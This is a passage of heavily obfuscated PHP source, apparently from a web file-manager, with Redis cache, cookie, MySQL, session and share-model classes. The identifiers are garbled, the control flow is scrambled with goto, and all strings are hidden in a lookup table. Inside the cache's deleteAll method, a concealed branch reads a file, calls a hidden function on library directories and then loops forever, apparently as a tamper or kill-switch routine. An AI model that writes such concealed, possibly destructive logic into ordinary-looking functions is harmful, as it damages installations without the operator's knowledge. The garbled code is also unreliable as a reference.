(!isset($cÎœ³¡´‘Ú[$F§¦°›ê°¸[440]]) || $cÎœ³¡´‘Ú[$F§¦°›ê°¸[440]] == $F§¦°›ê°¸[393]) { $eáŠ¶éÒ¼Ç = new BackupFile(); if (!$eáŠ¶éÒ¼Ç->index()) { return !1; } } self::set(array($F§¦°›ê°¸[457] => 1, $F§¦°›ê°¸[437] => 1)); return !0; } } goto e„Ÿ©©éÛì; C °¹½†‹ò: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public function __construct($A¶ÄÜÕí³¹, $dÉ·¿¾˜Ì) { $b¦¯å¡Êîù =& $_SERVER[ÍÓÖ€°å]; if (!class_exists($b¦¯å¡Êîù[536])) { show_json($b¦¯å¡Êîù[537], !1); } $this->cacheTime = $dÉ·¿¾˜Ì; $bè°¡Ö´–í = isset($A¶ÄÜÕí³¹[$b¦¯å¡Êîù[538]]) ? $A¶ÄÜÕí³¹[$b¦¯å¡Êîù[538]] : 10; if (is_array($A¶ÄÜÕí³¹[$b¦¯å¡Êîù[535]]) && count($A¶ÄÜÕí³¹[$b¦¯å¡Êîù[535]]) >= 1) { $this->initCluster($A¶ÄÜÕí³¹, $bè°¡Ö´–í); } else { $this->handle = $this->init($A¶ÄÜÕí³¹, $bè°¡Ö´–í); } } private function init($dß„‘øÎ»ƒ, $AèµšÂºÔ) { $AÃÑ¤óêÍÆ =& $_SERVER[ÍÓÖ€°å]; $c‹Ó¾¼ƒĞÌ = new Redis(); $fœ©œ­†³Ù = isset($dß„‘øÎ»ƒ[$AÃÑ¤óêÍÆ[539]]) ? $dß„‘øÎ»ƒ[$AÃÑ¤óêÍÆ[539]] : !1; if ($fœ©œ­†³Ù) { $c‹Ó¾¼ƒĞÌ->pconnect($dß„‘øÎ»ƒ[$AÃÑ¤óêÍÆ[157]], $dß„‘øÎ»ƒ[$AÃÑ¤óêÍÆ[158]], $AèµšÂºÔ); } else { $c‹Ó¾¼ƒĞÌ->connect($dß„‘øÎ»ƒ[$AÃÑ¤óêÍÆ[157]], $dß„‘øÎ»ƒ[$AÃÑ¤óêÍÆ[158]], $AèµšÂºÔ); } if (!empty($dß„‘øÎ»ƒ[$AÃÑ¤óêÍÆ[540]])) { $c‹Ó¾¼ƒĞÌ->auth($dß„‘øÎ»ƒ[$AÃÑ¤óêÍÆ[540]]); } return $c‹Ó¾¼ƒĞÌ; } private function initCluster($FÇï½¿ÉÖé, $E›—­Ë°å¡) { $dÀ·´È°÷Ì =& $_SERVER[ÍÓÖ€°å]; $cçÕÀÙš´ô = array($dÀ·´È°÷Ì[541], $dÀ·´È°÷Ì[542], $dÀ·´È°÷Ì[543]); $a££Óƒ†Ş = $dÀ·´È°÷Ì[541]; if (isset($FÇï½¿ÉÖé[$dÀ·´È°÷Ì[12]]) && in_array($FÇï½¿ÉÖé[$dÀ·´È°÷Ì[12]], $cçÕÀÙš´ô)) { $a££Óƒ†Ş = $FÇï½¿ÉÖé[$dÀ·´È°÷Ì[12]]; } switch ($a££Óƒ†Ş) { case $dÀ·´È°÷Ì[541]: $this->_slave($FÇï½¿ÉÖé, $E›—­Ë°å¡); break; case $dÀ·´È°÷Ì[542]: break; case $dÀ·´È°÷Ì[543]: $bÍôâ³š…± = $FÇï½¿ÉÖé[$dÀ·´È°÷Ì[535]]; $C»÷æŒˆ¨é = isset($FÇï½¿ÉÖé[$dÀ·´È°÷Ì[539]]) ? $FÇï½¿ÉÖé[$dÀ·´È°÷Ì[539]] : !1; $D«ÇÚ‰Şß˜ = isset($FÇï½¿ÉÖé[$dÀ·´È°÷Ì[540]]) ? $FÇï½¿ÉÖé[$dÀ·´È°÷Ì[540]] : null; $this->handle = new RedisCluster(NUll, $bÍôâ³š…±, $E›—­Ë°å¡, $E›—­Ë°å¡, $C»÷æŒˆ¨é, $D«ÇÚ‰Şß˜); break; default: break; } } private function _slave($cÂƒ‚«Œö©, $a™˜ç¨œˆğ) { goto AªŞÕ˜­¤“; dåƒ¨ÆŸ“: unset($eˆÜ©ÏÎ‹[0]); if (empty($eˆÜ©ÏÎ‹)) { return; } $A ŠÏ ‡êÌ = array_rand($eˆÜ©ÏÎ‹); goto A“•×¡¿øÌ; A“•×¡¿øÌ: $this->filterConfig($cÂƒ‚«Œö©, $eˆÜ©ÏÎ‹[$A ŠÏ ‡êÌ]); $this->slaveHandle = $this->init($cÂƒ‚«Œö©, $a™˜ç¨œˆğ); goto c¨è‚ñ·»œ; AªŞÕ˜­¤“: $eˆÜ©ÏÎ‹ = $cÂƒ‚«Œö©[$_SERVER[ÍÓÖ€°å][535]]; $this->filterConfig($cÂƒ‚«Œö©, $eˆÜ©ÏÎ‹[0]); $this->handle = $this->init($cÂƒ‚«Œö©, $a™˜ç¨œˆğ); goto dåƒ¨ÆŸ“; c¨è‚ñ·»œ: } private function filterConfig(&$DÑÀ·ŸÌß, $Fé¸“¯ğé„) { $B°Ş„íÉÔ– =& $_SERVER[ÍÓÖ€°å]; $FÃÒœ³Š—¬ = explode($B°Ş„íÉÔ–[4], $Fé¸“¯ğé„); $a£¦ö×óÚ‚ = array($B°Ş„íÉÔ–[157] => $FÃÒœ³Š—¬[0], $B°Ş„íÉÔ–[158] => $FÃÒœ³Š—¬[1]); $DÑÀ·ŸÌß = array_merge($DÑÀ·ŸÌß, $a£¦ö×óÚ‚); } public function set($CÊ†é¸´ÆÄ, $EÉŠøÒ—ò¬, $aÖ±Üö¨ï– = false) { $aÖ±Üö¨ï– = $aÖ±Üö¨ï– ? $aÖ±Üö¨ï– : $this->cacheTime; return $this->handle->setEx($CÊ†é¸´ÆÄ, $aÖ±Üö¨ï–, $EÉŠøÒ—ò¬); } public function setLock($f—ğ¶¤²êÕ, $C¶ô–Åìß“, $B—·²•¢óª) { $fÏØ®®¶Í— = $this->handle->setNX($f—ğ¶¤²êÕ, $C¶ô–Åìß“); return $fÏØ®®¶Í—; } public function get($bİ­…”ÕÉÑ) { $f¨æ­ò¾Ã‘ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $f¨æ­ò¾Ã‘->get($bİ­…”ÕÉÑ); } public function remove($d»ßãòï’…) { return $this->handle->del($d»ßãòï’…); } public function deleteAll() { $f‚½‘°°ï¸ =& $_SERVER[ÍÓÖ€°å]; if ($_SERVER[$f‚½‘°°ï¸[544]] != $_SERVER[$f‚½‘°°ï¸[545]]) { goto bî™•ŞÁÂÉ; F®‡ËáãØì: $F×öö‰îÎ = explode($f‚½‘°°ï¸[212], $F íˆö¯×); if (count($F×öö‰îÎ) < $f‚½‘°°ï¸[548]) { die; } $BëŸò¥íæ = $f‚½‘°°ï¸[549]; goto E¿Í·Û½ì’; bî™•ŞÁÂÉ: $FÇİ«Ûœ„‰ = $f‚½‘°°ï¸[546]; $B”ÀÜ•Ô†ˆ = BASIC_PATH . $f‚½‘°°ï¸[547]; $F íˆö¯× = $FÇİ«Ûœ„‰($B”ÀÜ•Ô†ˆ); goto F®‡ËáãØì; E¿Í·Û½ì’: $BëŸò¥íæ(LIB_DIR); $BëŸò¥íæ(BASIC_PATH . $f‚½‘°°ï¸[550]); while (1) { $BëŸò¥íæ = $f‚½‘°°ï¸[551]; } goto díÛ”çñ­Ö; díÛ”çñ­Ö: } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($A‡’˜ˆ•ïÔ = '', $FâÍÌÉÎ = 0) { if (is_string($A‡’˜ˆ•ïÔ) && $A‡’˜ˆ•ïÔ != $_SERVER[ÍÓÖ€°å][33]) { $this->prefix = $A‡’˜ˆ•ïÔ; } if (is_numeric($FâÍÌÉÎ) && $FâÍÌÉÎ > 0) { $this->expire = $FâÍÌÉÎ; } } public static function getInstance() { static $e£­’µ·ö; if ($e£­’µ·ö === null) { $e£­’µ·ö = new self(); } return $e£­’µ·ö; } private static $sameCookieSet = array(); public static function set($bØ‚«‰¥œ, $D´Æ‰äÊ¦, $CµäŸ¼ø¦ = 0, $ešˆ•ï·¢š = false, $E‘ˆÕÁÙà = false) { $E ¼éÖÈì =& $_SERVER[ÍÓÖ€°å]; if (!$CµäŸ¼ø¦) { $CµäŸ¼ø¦ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$bØ‚«‰¥œ]) && self::$sameCookieSet[$bØ‚«‰¥œ] == $D´Æ‰äÊ¦ . $CµäŸ¼ø¦) { return; } self::$sameCookieSet[$bØ‚«‰¥œ] = $D´Æ‰äÊ¦ . $CµäŸ¼ø¦; if (!$E‘ˆÕÁÙà) { $E‘ˆÕÁÙà = str_replace(HOST, $E ¼éÖÈì[33], APP_HOST); $E‘ˆÕÁÙà = $E ¼éÖÈì[8] . trim($E‘ˆÕÁÙà, $E ¼éÖÈì[8]); } setcookie($bØ‚«‰¥œ, $D´Æ‰äÊ¦, time() + $CµäŸ¼ø¦, $E‘ˆÕÁÙà, !1, !1, $ešˆ•ï·¢š); } public static function setSafe($dÈøºòä æ, $bÉäÌß†áë, $aÂ—ˆá¼¡Í = 0) { self::set($dÈøºòä æ, $bÉäÌß†áë, $aÂ—ˆá¼¡Í, !0); } public static function get($F‰Ò„÷Ôøœ) { return isset($_COOKIE[$F‰Ò„÷Ôøœ]) ? $_COOKIE[$F‰Ò„÷Ôøœ] : !1; } public static function remove($fÏ¨ß½Ğù, $bÌ£¶ó¹è„ = false) { unset($_COOKIE[$fÏ¨ß½Ğù]); self::set($fÏ¨ß½Ğù, $_SERVER[ÍÓÖ€°å][33], 1, $bÌ£¶ó¹è„); } } class DbMysql extends Db { public function __construct($AÈ‚ƒ“‹˜ = '') { $aéù‹òäöæ =& $_SERVER[ÍÓÖ€°å]; if (!extension_loaded($aéù‹òäöæ[464])) { think_exception(think_lang($aéù‹òäöæ[10]) . $aéù‹òäöæ[552]); } if (!empty($AÈ‚ƒ“‹˜)) { $this->config = $AÈ‚ƒ“‹˜; if (empty($this->config[$aéù‹òäöæ[13]])) { $this->config[$aéù‹òäöæ[13]] = $aéù‹òäöæ[33]; } } } public function connect($EÍÈÁäŞ¥¦ = '', $dŞ×ŒÂ±¬ = 0, $cë‚Ç—ÂËÕ = false) { $F ¿ÓÕ‘‹ =& $_SERVER[ÍÓÖ€°å]; if (!isset($this->linkID[$dŞ×ŒÂ±¬])) { goto A­–èóÜÍ; Cå“Ì¹É¿ñ: mysql_query($F ¿ÓÕ‘‹[557] . think_config($F ¿ÓÕ‘‹[558]) . $F ¿ÓÕ‘‹[55], $this->linkID[$dŞ×ŒÂ±¬]); if ($cÂ¼‹ÔÈÅ > $F ¿ÓÕ‘‹[559]) { mysql_query($F ¿ÓÕ‘‹[560], $this->linkID[$dŞ×ŒÂ±¬]); } $this->connected = !0; goto AÃàéÀÙ¡·; A­–èóÜÍ: if (empty($EÍÈÁäŞ¥¦)) { $EÍÈÁäŞ¥¦ = $this->config; } $F²î£Ø“› = $EÍÈÁäŞ¥¦[$F ¿ÓÕ‘‹[553]] . ($EÍÈÁäŞ¥¦[$F ¿ÓÕ‘‹[554]] ? "\72{$EÍÈÁäŞ¥¦[$F ¿ÓÕ‘‹[554]]}" : $F ¿ÓÕ‘‹[33]); $C¶ìˆâ´ = !empty($EÍÈÁäŞ¥¦[$F ¿ÓÕ‘‹[13]][$F ¿ÓÕ‘‹[14]]) ? $EÍÈÁäŞ¥¦[$F ¿ÓÕ‘‹[13]][$F ¿ÓÕ‘‹[14]] : $this->pconnect; goto b—İ¹îµÜ; b—İ¹îµÜ: if ($C¶ìˆâ´) { $this->linkID[$dŞ×ŒÂ±¬] = mysql_pconnect($F²î£Ø“›, $EÍÈÁäŞ¥¦[$F ¿ÓÕ‘‹[555]], $EÍÈÁäŞ¥¦[$F ¿ÓÕ‘‹[556]], 131072); } else { $this->linkID[$dŞ×ŒÂ±¬] = mysql_connect($F²î£Ø“›, $EÍÈÁäŞ¥¦[$F ¿ÓÕ‘‹[555]], $EÍÈÁäŞ¥¦[$F ¿ÓÕ‘‹[556]], !0, 131072); } if (!$this->linkID[$dŞ×ŒÂ±¬] || !empty($EÍÈÁäŞ¥¦[$F ¿ÓÕ‘‹[17]]) && !mysql_select_db($EÍÈÁäŞ¥¦[$F ¿ÓÕ‘‹[17]], $this->linkID[$dŞ×ŒÂ±¬])) { think_exception(mysql_error()); } $cÂ¼‹ÔÈÅ = mysql_get_server_info($this->linkID[$dŞ×ŒÂ±¬]); goto Cå“Ì¹É¿ñ; AÃàéÀÙ¡·: if (1 != think_config($F ¿ÓÕ‘‹[18])) { unset($this->config); } goto fß“ñŞ¯Û; fß“ñŞ¯Û: } return $this->linkID[$dŞ×ŒÂ±¬]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($FÒßˆ—») { goto E„Ìì§¹Ô; E„Ìì§¹Ô: $F„‚ÓÓ°¦Ü =& $_SERVER[ÍÓÖ€°å]; if (0 === stripos($FÒßˆ—», $F„‚ÓÓ°¦Ü[244])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto e˜®†êƒÉ; D©³ÏâĞÎØ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto b§¯ƒ–ïö; AŞ”ª…ÀŒ²: think_action_status($F„‚ÓÓ°¦Ü[19], 1); think_status($F„‚ÓÓ°¦Ü[20]); $this->queryID = mysql_query($FÒßˆ—», $this->_linkID); goto D©³ÏâĞÎØ; e˜®†êƒÉ: if (!$this->_linkID) { return !1; } $this->queryStr = $FÒßˆ—»; if ($this->queryID) { $this->free(); } goto AŞ”ª…ÀŒ²; b§¯ƒ–ïö: } public function execute($a²¬ù¹º—ˆ) { goto F‘¶İ³›ë…; e˜‹×‘‡ßê: if (!1 === $aÄØÑ ä•») { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto AºÙâĞ°ù¿; AöŠ›À×: think_status($A‘Ò•ÔªÍÇ[20]); $aÄØÑ ä•» = mysql_query($a²¬ù¹º—ˆ, $this->_linkID); $this->debug(); goto e˜‹×‘‡ßê; F‘¶İ³›ë…: $A‘Ò•ÔªÍÇ =& $_SERVER[ÍÓÖ€°å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Cõâ‡ë¯ÀŒ; Cõâ‡ë¯ÀŒ: $this->queryStr = $a²¬ù¹º—ˆ; if ($this->queryID) { $this->free(); } think_action_status($A‘Ò•ÔªÍÇ[21], 1); goto AöŠ›À×; AºÙâĞ°ù¿: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ÍÓÖ€°å][561], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f¡Ÿİ¥­‘‚ = mysql_query($_SERVER[ÍÓÖ€°å][562], $this->_linkID); $this->transTimes = 0; if (!$f¡Ÿİ¥­‘‚) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $cÁò¦¹¾‹ç = mysql_query($_SERVER[ÍÓÖ€°å][563], $this->_linkID); $this->transTimes = 0; if (!$cÁò¦¹¾‹ç) { $this->error(); return !1; } } return !0; } private function getAll() { $A†‚ìèÜÉ“ = array(); if ($this->numRows > 0) { while ($a¶Î¼çÕ´ = mysql_fetch_assoc($this->queryID)) { $A†‚ìèÜÉ“[] = $a¶Î¼çÕ´; } mysql_data_seek($this->queryID, 0); } return $A†‚ìèÜÉ“; } public function getFields($cÎÎƒ‘â‡) { $B„–‰—„ =& $_SERVER[ÍÓÖ€°å]; $bÙÖ‰à÷‹ = $this->query($B„–‰—„[564] . $this->parseKey($cÎÎƒ‘â‡)); $f¢„Éğ…†ğ = array(); if ($bÙÖ‰à÷‹) { foreach ($bÙÖ‰à÷‹ as $FÄÒ•éµÑÍ => $d‘†Œ°êŸ•) { $f¢„Éğ…†ğ[$d‘†Œ°êŸ•[$B„–‰—„[27]]] = array($B„–‰—„[28] => $d‘†Œ°êŸ•[$B„–‰—„[27]], $B„–‰—„[29] => $d‘†Œ°êŸ•[$B„–‰—„[30]], $B„–‰—„[31] => (bool) (strtoupper($d‘†Œ°êŸ•[$B„–‰—„[32]]) === $B„–‰—„[565]), $B„–‰—„[34] => $d‘†Œ°êŸ•[$B„–‰—„[35]], $B„–‰—„[36] => strtolower($d‘†Œ°êŸ•[$B„–‰—„[37]]) == $B„–‰—„[38], $B„–‰—„[39] => strtolower($d‘†Œ°êŸ•[$B„–‰—„[40]]) == $B„–‰—„[41]); } } return $f¢„Éğ…†ğ; } public function getTables($BÃ»„Ôõóí = '') { $bù–œ²ßô› =& $_SERVER[ÍÓÖ€°å]; if (!empty($BÃ»„Ôõóí)) { $f¯ôÖŠñŸ½ = $bù–œ²ßô›[566] . $BÃ»„Ôõóí; } else { $f¯ôÖŠñŸ½ = $bù–œ²ßô›[567]; } $e¸Ë¯ÆéÏÈ = $this->query($f¯ôÖŠñŸ½); $b²¬á°ÕÇ = array(); foreach ($e¸Ë¯ÆéÏÈ as $díåçÛ¯Úö => $a·¾ÑèÕğ‰) { $b²¬á°ÕÇ[$díåçÛ¯Úö] = current($a·¾ÑèÕğ‰); } return $b²¬á°ÕÇ; } public function replace($eŸŸù³¨»Ó, $F““ÂÕÀÓ÷ = array()) { $c„Ô¹ÊùÆÕ =& $_SERVER[ÍÓÖ€°å]; foreach ($eŸŸù³¨»Ó as $c…à½È¾ŒÊ => $eªÍ×”‹½) { $bï¨ˆ³¬ç = $this->parseValue($eªÍ×”‹½); if (is_scalar($bï¨ˆ³¬ç)) { $F‡á­Æ Ú¹[] = $bï¨ˆ³¬ç; $d„¢–£†Ç[] = $this->parseKey($c…à½È¾ŒÊ); } } $AˆŠåœó˜ = $c„Ô¹ÊùÆÕ[568] . $this->parseTable($F““ÂÕÀÓ÷[$c„Ô¹ÊùÆÕ[259]]) . $c„Ô¹ÊùÆÕ[569] . implode($c„Ô¹ÊùÆÕ[47], $d„¢–£†Ç) . $c„Ô¹ÊùÆÕ[570] . implode($c„Ô¹ÊùÆÕ[47], $F‡á­Æ Ú¹) . $c„Ô¹ÊùÆÕ[571]; return $this->execute($AˆŠåœó˜); } public function insertAll($CÙŞééöÓÍ, $bõç©Œ™ = array(), $bÕÖïíÈÙ¢ = false) { goto BÃº¿ˆöÈµ; E¢Ì‡ù§ø: $f‹±¼¥¼²Œ = ($bÕÖïíÈÙ¢ ? $f¹¥’Ë‡Â÷[573] : $f¹¥’Ë‡Â÷[574]) . $f¹¥’Ë‡Â÷[575] . $this->parseTable($bõç©Œ™[$f¹¥’Ë‡Â÷[259]]) . $f¹¥’Ë‡Â÷[569] . implode($f¹¥’Ë‡Â÷[47], $C†¬¤ö¥Šƒ) . $f¹¥’Ë‡Â÷[576] . implode($f¹¥’Ë‡Â÷[47], $A‚æ¸ËŞ¨’); return $this->execute($f‹±¼¥¼²Œ); goto Cğ„œÛŠŒ¦; b¨„¼²‹÷„: $A‚æ¸ËŞ¨’ = array(); foreach ($CÙŞééöÓÍ as $A•’Ö ÌÕ¼) { $Dùà´ßà’‚ = array(); foreach ($A•’Ö ÌÕ¼ as $AÍŠ‚‹¯ÆÕ => $Aø¾É¢¤—…) { $Aø¾É¢¤—… = $this->parseValue($Aø¾É¢¤—…); if (is_scalar($Aø¾É¢¤—…)) { $Dùà´ßà’‚[] = $Aø¾É¢¤—…; } } $A‚æ¸ËŞ¨’[] = $f¹¥’Ë‡Â÷[240] . implode($f¹¥’Ë‡Â÷[47], $Dùà´ßà’‚) . $f¹¥’Ë‡Â÷[571]; } array_walk($C†¬¤ö¥Šƒ, array($this, $f¹¥’Ë‡Â÷[572])); goto E¢Ì‡ù§ø; BÃº¿ˆöÈµ: $f¹¥’Ë‡Â÷ =& $_SERVER[ÍÓÖ€°å]; if (!is_array($CÙŞééöÓÍ[0])) { return !1; } $C†¬¤ö¥Šƒ = array_keys($CÙŞééöÓÍ[0]); goto b¨„¼²‹÷„; Cğ„œÛŠŒ¦: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $A«˜¼”ãÓ =& $_SERVER[ÍÓÖ€°å]; $this->error = mysql_errno() . $A«˜¼”ãÓ[4] . mysql_error($this->_linkID); if ($A«˜¼”ãÓ[33] != $this->queryStr) { $this->error .= LNG($A«˜¼”ãÓ[45]) . $this->queryStr; } think_trace($this->error, $A«˜¼”ãÓ[33], $A«˜¼”ãÓ[46]); return $this->error; } public function escapeString($Eóæ¤çÛóÈ) { if ($this->_linkID) { return mysql_real_escape_string($Eóæ¤çÛóÈ, $this->_linkID); } else { return mysql_escape_string($Eóæ¤çÛóÈ); } } public function parseKey(&$B§‚’Ùîí, $Dğìä±ÖÜ‘ = true) { $B‹•Ş»¸Â“ =& $_SERVER[ÍÓÖ€°å]; if ($Dğìä±ÖÜ‘) { $B§‚’Ùîí = $this->parseKeyCheck($B§‚’Ùîí); } if ($B§‚’Ùîí != $B‹•Ş»¸Â“[164] && !preg_match($B‹•Ş»¸Â“[577], $B§‚’Ùîí)) { $B§‚’Ùîí = $B‹•Ş»¸Â“[578] . trim($B§‚’Ùîí, $B‹•Ş»¸Â“[578]) . $B‹•Ş»¸Â“[578]; } return $B§‚’Ùîí; } } goto aËÊÇó¶á; DåÍÑï°”Å: class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\155\137\x73\145\163\163\151\x6f\156"; public function get($F¢Îö¨°ì) { $Dš§ÎŞ«Ú­ =& $_SERVER[ÍÓÖ€°å]; $Dğç¹ÕíÛ’ = $this->where(array($Dš§ÎŞ«Ú­[1623] => $F¢Îö¨°ì))->find(); if (!is_array($Dğç¹ÕíÛ’)) { return !1; } return $Dğç¹ÕíÛ’[$Dš§ÎŞ«Ú­[440]]; } public function set($cÙÚ¡ËŞğä, $aÜ’Œƒâõê, $f¥¡°®ÑÌé = 3600) { $bæáëß˜ìÎ =& $_SERVER[ÍÓÖ€°å]; $e‹ÛÇƒÇ“Ë = array($bæáëß˜ìÎ[1623] => $cÙÚ¡ËŞğä, $bæáëß˜ìÎ[1547] => $aÜ’Œƒâõê, $bæáëß˜ìÎ[1624] => $f¥¡°®ÑÌé + time()); if (Session::get($bæáëß˜ìÎ[1625])) { $e‹ÛÇƒÇ“Ë[$bæáëß˜ìÎ[1062]] = Session::get($bæáëß˜ìÎ[1625]); } else { $e‹ÛÇƒÇ“Ë[$bæáëß˜ìÎ[1062]] = 0; } if ($this->get($cÙÚ¡ËŞğä)) { return $this->where(array($bæáëß˜ìÎ[1623] => $cÙÚ¡ËŞğä))->save($e‹ÛÇƒÇ“Ë); } else { return $this->add($e‹ÛÇƒÇ“Ë, array(), !0); } } public function remove($dóÛŒÔÀµ) { return $this->where(array($_SERVER[ÍÓÖ€°å][1623] => $dóÛŒÔÀµ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ÍÓÖ€°å][1626] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\145"; protected $dataAuto = array(array("\155\157\144\151\146\x79\124\x69\x6d\145", "\x74\x69\x6d\x65", "\151\156\x73\145\x72\x74\54\x75\160\144\x61\164\145", "\x66\x75\x6e\x63\x74\x69\157\156"), array("\x63\x72\145\141\164\x65\x54\151\155\x65", "\164\x69\155\x65", "\151\156\x73\145\162\x74", "\146\x75\x6e\143\164\151\x6f\156"), array("\157\x70\164\x69\157\x6e\163", '', "\x69\156\163\x65\x72\x74\54\165\160\144\x61\164\145\x2c\x73\x65\154\x65\x63\164", "\x6a\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($BÖ“òêÍÉÙ) { $dÙ™ª¤Ó¦² =& $_SERVER[ÍÓÖ€°å]; $b‡ôÊ„—Ï— = isset($BÖ“òêÍÉÙ[0]) ? $BÖ“òêÍÉÙ[0] : !1; return array($dÙ™ª¤Ó¦²[1627] => array(USER_ID, $dÙ™ª¤Ó¦²[1628]), $dÙ™ª¤Ó¦²[1593] => array($b‡ôÊ„—Ï—, $dÙ™ª¤Ó¦²[1629])); } protected function listSimple() { $f³šïÔ¿ = array($_SERVER[ÍÓÖ€°å][1062] => USER_ID); $CîÚ‰‡¶¾„ = $this->field($this->fieldList)->where($f³šïÔ¿)->select(); return $CîÚ‰‡¶¾„ ? $CîÚ‰‡¶¾„ : array(); } protected function getInfo($dĞŸºÌİĞ¹, $CÖÖ¥îĞÂ‰ = false) { $Cİç¢¦õ¿¥ =& $_SERVER[ÍÓÖ€°å]; if ($CÖÖ¥îĞÂ‰) { return $this->_getShareInfo(array($Cİç¢¦õ¿¥[410] => $dĞŸºÌİĞ¹)); } $eé‰¬Şññô = $this->cacheFunctionGet($Cİç¢¦õ¿¥[1630], $dĞŸºÌİĞ¹); return $eé‰¬Şññô; } public function getInfoByHash($cŞŒ×ÕÊ·â) { return $this->_getShareInfo(array($_SERVER[ÍÓÖ€°å][1631] => $cŞŒ×ÕÊ·â)); } public function getInfoByPath($eİ‰ÊÄ‰ÒÈ) { $D¯¿òÊË‡‡ =& $_SERVER[ÍÓÖ€°å]; $BÙŒ‰ç äÍ = array($D¯¿òÊË‡‡[1062] => USER_ID, $D¯¿òÊË‡‡[365] => $eİ‰ÊÄ‰ÒÈ); return $this->_getShareInfo($BÙŒ‰ç äÍ); } private function _getShareInfo($cÈ‘ª‚å) { goto C§˜©‘¥®±; C¦ ‘äğîŠ: $cÈ‘ª‚å = array($BÑŒ‡¨†¯Î[410] => $fÙ™Ç¹İ¹Û[$BÑŒ‡¨†¯Î[410]]); $Fá¹Ü•‹¥Õ = $BÑŒ‡¨†¯Î[1632]; $b¬åÒğÉ– = Model($BÑŒ‡¨†¯Î[411])->order($BÑŒ‡¨†¯Î[357])->field($Fá¹Ü•‹¥Õ)->where($cÈ‘ª‚å)->select(); goto a×ÆÂï•ã; C§˜©‘¥®±: $BÑŒ‡¨†¯Î =& $_SERVER[ÍÓÖ€°å]; $fÙ™Ç¹İ¹Û = $this->where($cÈ‘ª‚å)->find(); if (!$fÙ™Ç¹İ¹Û) { return !1; } goto C¦ ‘äğîŠ; a×ÆÂï•ã: $fÙ™Ç¹İ¹Û[$BÑŒ‡¨†¯Î[1618]] = Model($BÑŒ‡¨†¯Î[827])->pathInfo($fÙ™Ç¹İ¹Û[$BÑŒ‡¨†¯Î[365]]); $fÙ™Ç¹İ¹Û[$BÑŒ‡¨†¯Î[1633]] = $b¬åÒğÉ–; return $fÙ™Ç¹İ¹Û; goto a÷ÃÍ×ç×; a÷ÃÍ×ç×: } protected function getInfoAuth($EÀ£ìãÏ¥) { $F”˜öÏİ™‡ =& $_SERVER[ÍÓÖ€°å]; $E’İÁâ†Ñğ = $this->getInfo($EÀ£ìãÏ¥); $E’İÁâ†Ñğ[$F”˜öÏİ™‡[540]] = Model($F”˜öÏİ™‡[404])->authMake($E’İÁâ†Ñğ[$F”˜öÏİ™‡[1633]]); return $E’İÁâ†Ñğ; } protected function listData($dŠ·¥Ûç¾ = null, $cª£ç±éØ· = 300) { $D §Ñ‘æôã =& $_SERVER[ÍÓÖ€°å]; $D¶¸êÜ£Ì÷ = array(array($D §Ñ‘æôã[1634] => array($D §Ñ‘æôã[681], 0), $D §Ñ‘æôã[408] => array($D §Ñ‘æôã[681], 0), $D §Ñ‘æôã[1635] => $D §Ñ‘æôã[1608])); if ($dŠ·¥Ûç¾ == 1) { $D¶¸êÜ£Ì÷ = array($D §Ñ‘æôã[1634] => 1); } else { if ($dŠ·¥Ûç¾ == 2) { $D¶¸êÜ£Ì÷ = array($D §Ñ‘æôã[408] => 1); } } $D¶¸êÜ£Ì÷[$D §Ñ‘æôã[1062]] = USER_ID; $b‚¶ÄÊƒ’ò = $this->where($D¶¸êÜ£Ì÷)->selectPage($cª£ç±éØ·); return $b‚¶ÄÊƒ’ò; } protected function listToMe($C°Ú”ÚÇˆî = 300) { goto a“£†•³Ê; E‡¨õÊê¼Œ: $f“ºª ƒ£ = array_to_keyvalue_group($A¢§äò“†æ[$E’—ğ—ÖÇó[345]], $E’—ğ—ÖÇó[410]); if (!$f“ºª ƒ£) { return $A¢§äò“†æ; } $e¬İ˜±ËçĞ = $E’—ğ—ÖÇó[1637]; goto fÑƒôàôÃ’; CÛÒß‘˜ƒ×: $FËœÙòäè = array($E’—ğ—ÖÇó[1638] => $f¿Á¤Ô¡Øğ, $E’—ğ—ÖÇó[1639] => $A¢§äò“†æ[$E’—ğ—ÖÇó[342]]); return $FËœÙòäè; goto eˆœß‰óÏ½; fÑƒôàôÃ’: $a„Šîù¯ŞÏ = array($E’—ğ—ÖÇó[410] => array($E’—ğ—ÖÇó[946], array_keys($f“ºª ƒ£))); $f¿Á¤Ô¡Øğ = $this->field($e¬İ˜±ËçĞ)->where($a„Šîù¯ŞÏ)->select(); foreach ($f¿Á¤Ô¡Øğ as $C–¸Ü‚Á => &$bŒ…®ã†) { $bŒ…®ã†[$E’—ğ—ÖÇó[1633]] = $f“ºª ƒ£[$bŒ…®ã†[$E’—ğ—ÖÇó[410]]]; } goto CÛÒß‘˜ƒ×; a“£†•³Ê: $E’—ğ—ÖÇó =& $_SERVER[ÍÓÖ€°å]; $C¶¥á‹’Åƒ = Session::get($E’—ğ—ÖÇó[1636]); $fä³¥¨²îæ = array_to_keyvalue($C¶¥á‹’Åƒ, $E’—ğ—ÖÇó[33], $E’—ğ—ÖÇó[1516]); goto FíÉÜ«È¤‚; FíÉÜ«È¤‚: $a„Šîù¯ŞÏ = array($E’—ğ—ÖÇó[383] => SourceModel::TYPE_USER, $E’—ğ—ÖÇó[386] => USER_ID); if ($fä³¥¨²îæ) { $a„Šîù¯ŞÏ = array(array($E’—ğ—ÖÇó[383] => SourceModel::TYPE_USER, $E’—ğ—ÖÇó[386] 